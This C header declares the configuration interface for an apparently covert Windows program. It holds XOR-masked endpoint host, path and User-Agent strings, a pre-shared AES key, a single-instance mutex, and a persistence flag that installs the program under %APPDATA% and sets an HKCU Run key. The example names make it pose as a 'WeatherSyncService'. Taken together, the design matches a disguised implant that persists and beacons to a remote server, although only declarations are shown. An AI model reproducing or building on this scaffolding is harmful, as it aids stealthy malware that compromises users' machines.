// Public API for build-generated configuration data (Module 2 emits gen_strings.h).
// Sensitive values live XOR-masked in the binary; callers decrypt on use and
// wipe the destination buffer with SecureZeroMemory when done.
#ifndef CONFIG_H
#define CONFIG_H

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

typedef enum {
    CFG_HOST,     // endpoint hostname (e.g. "w-view.example.com")
    CFG_PATH,     // endpoint path (e.g. "/api/sync")
    CFG_UA,       // User-Agent string
    CFG_MUTEX,    // single-instance mutex name (e.g. "Global\\NorthlaneWeatherSync")
    CFG_APPDIR,   // install dir name under %APPDATA% (e.g. "Northlane")
    CFG_RUNVAL,   // HKCU Run value name (e.g. "WeatherSyncService")
    CFG_EXEFILE,  // installed exe filename (e.g. "WeatherSyncService.exe")
    CFG_COUNT
} CfgStrId;

// Decrypts the named string into `out` as a wide (UTF-16) string.
void cfg_get_str(CfgStrId id, wchar_t *out, size_t cap);

// Decrypts the 32-byte pre-shared AES key into `out`.
void cfg_get_psk(uint8_t out[32]);

// Build-time booleans from gen_strings.h:
// CFG_PERSIST            - install to %APPDATA% + HKCU Run key on first run
// CFG_ALLOW_HTTP_LOCAL   - permit plain http://localhost:<port> for local testing
// CFG_LOCAL_PORT         - port used when CFG_ALLOW_HTTP_LOCAL and host is localhost

#endif
